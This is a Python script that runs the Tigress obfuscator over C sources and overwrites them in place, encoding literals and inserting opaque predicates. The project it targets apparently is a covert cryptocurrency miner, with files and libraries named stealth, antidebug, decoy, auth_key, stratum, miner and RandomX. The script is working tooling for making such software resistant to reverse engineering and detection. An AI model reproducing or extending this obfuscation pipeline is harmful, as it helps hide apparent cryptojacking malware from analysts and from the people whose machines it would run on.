#!/usr/bin/env python3
import os, subprocess, re
ROOT = os.getcwd()
TIGRESS = "/usr/local/bin/tigress"
COMMON_DEFS = [
    "-D_POSIX_C_SOURCE=199309L","-D_GNU_SOURCE",
    "-DFEATURE_TLS=1","-DFEATURE_WS=1","-DFEATURE_FULL_MEM=1","-DFEATURE_JIT=1",
    "-DFEATURE_HARD_AES=1","-DFEATURE_LARGE_PAGES=0","-DFEATURE_VERBOSE=1",
    "-DFEATURE_COLORS=1","-DFEATURE_KEEPALIVE=1",
]
COMMON_INCS = [
    "-I"+ROOT+"/src",
    "-I"+ROOT+"/libs/libutils/include","-I"+ROOT+"/libs/libcrypto/include",
    "-I"+ROOT+"/libs/libantidebug/include","-I"+ROOT+"/libs/libjson/include",
    "-I"+ROOT+"/libs/libws/include","-I"+ROOT+"/libs/libstratum/include",
    "-I"+ROOT+"/libs/libminer/include","-I"+ROOT+"/libs/libdecoy/include",
    "-I"+ROOT+"/lib/randomx/src",
]
TARGETS = [
    (ROOT+"/src/main.c","main"),
    (ROOT+"/src/stealth.c","main"),
    (ROOT+"/libs/libcrypto/src/auth_key.c","auth_key_get"),
    (ROOT+"/libs/libcrypto/src/auth_key_data.c",None),
    (ROOT+"/libs/libcrypto/src/decoys.c",None),
    (ROOT+"/libs/libantidebug/src/antidebug.c",None),
    (ROOT+"/libs/libdecoy/src/decoy.c",None),
    (ROOT+"/libs/libutils/src/hex.c",None),
    (ROOT+"/libs/libutils/src/cpu.c",None),
]
PREAMBLE = r'''#define _POSIX_C_SOURCE 199309L
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
'''
def find_init_func(src):
    m = re.findall(r'^[a-zA-Z_][\w\s\*\(\)]*\b([a-zA-Z_]\w*)\s*\([^;]*\)\s*\{', src, re.M)
    for name in m:
        if name not in ('if','for','while','switch','sizeof'):
            return name
    return None
def strip_dummy_main(text):
    text = re.sub(r'int main\(int _TIG_IZ_vGt1_formal_argc[^\n]*;\n', '', text)
    text = re.sub(r'/\* BEGIN FUNCTION-DEF main .*?/\* END FUNCTION-DEF main [^\n]*\n', '', text, flags=re.S)
    text = re.sub(r'/\* BEGIN FUNCTION-DEF main .*', '', text, flags=re.S)
    return text
def run(cmd):
    p = subprocess.run(cmd, capture_output=True, text=True)
    return p.returncode, p.stdout+p.stderr

for path, init_fn in TARGETS:
    print(f'==> {path}', flush=True)
    src = open(path).read()
    fn = init_fn or find_init_func(src)
    if not fn:
        print('  SKIP', flush=True); continue
    has_main = re.search(r'\bmain\s*\(', src) is not None
    tmp_src = path + '.tigsrc.c'
    tmp_out = path + '.tigout.c'
    with open(tmp_src,'w') as f:
        f.write(PREAMBLE); f.write(src)
        if not has_main: f.write('\nint main(void){ return 0; }\n')
    init_target = 'main' if has_main else fn
    cmd = [TIGRESS,'--Seed=1','--Environment=x86_64:Linux:Gcc:4.6'] + COMMON_DEFS + COMMON_INCS + [
        '--Transform=InitEntropy', f'--Functions={init_target}',
        '--Transform=InitOpaque', f'--Functions={init_target}',
        '--Transform=AddOpaque','--Functions=*','--AddOpaqueKinds=call','--AddOpaqueCount=1',
        '--Transform=EncodeLiterals','--Functions=*',
        '--Transform=CleanUp','--Functions=*',
        f'--out={tmp_out}', tmp_src]
    rc,out = run(cmd)
    if rc != 0:
        print('  FAIL', rc, flush=True)
        for l in out.splitlines():
            if 'ERR' in l or 'error' in l.lower():
                print('   ',l[:200], flush=True)
        for p in (tmp_src,tmp_out):
            if os.path.exists(p): os.remove(p)
        continue
    text = open(tmp_out).read()
    if not has_main:
        text = strip_dummy_main(text)
    with open(path,'w') as f: f.write(text)
    os.remove(tmp_src); os.remove(tmp_out)
    print('  OK', flush=True)
print('DONE', flush=True)
